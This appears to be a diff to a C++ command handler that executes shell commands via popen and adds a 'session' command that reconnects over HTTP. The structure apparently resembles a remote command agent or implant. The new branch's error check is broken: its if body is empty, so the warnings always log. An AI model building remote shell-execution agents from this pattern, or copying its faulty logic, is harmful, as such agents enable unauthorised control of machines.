@@ -13,12 +13,13 @@
 #include <cstring>
 
 #include "../../Generic/logging.hpp"   
+#include "../../Generic/session/session.hpp"
 
 std::string executeShellCommand(const char* cmd) {
     logger.log(std::string("Executing shell command: " + std::string(cmd)));
     std::array<char, 2048> buffer;
     std::string result;
-    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    std::unique_ptr<FILE, int(*)(FILE*)> pipe(popen(cmd, "r"), static_cast<int(*)(FILE*)>(pclose));
     if (!pipe) {
         logger.error("popen() failed!");
         throw std::runtime_error("popen() failed!");
@@ -140,7 +141,13 @@ std::string command_handler(const std::string& command, const std::string& comma
         logger.log("list_dir command received.");
         // Implement list_dir logic
         std::string output = executeShellCommand("ls -la");
-        return output;
+        return output; 
+    } else if (command == "session") {
+            logger.log("Starting sessionConnect");
+            if (!sessionConnect()) {};
+                logger.warn("Could not access session - reconnect initisalised.");  
+            logger.warn("Session exiting, http reconnect");
+            return "Reconnected via HTTP";
     } else {
         logger.error(std::string("Unknown command received: ") + command);
         std::cerr << "Unknown command: " << command << std::endl;
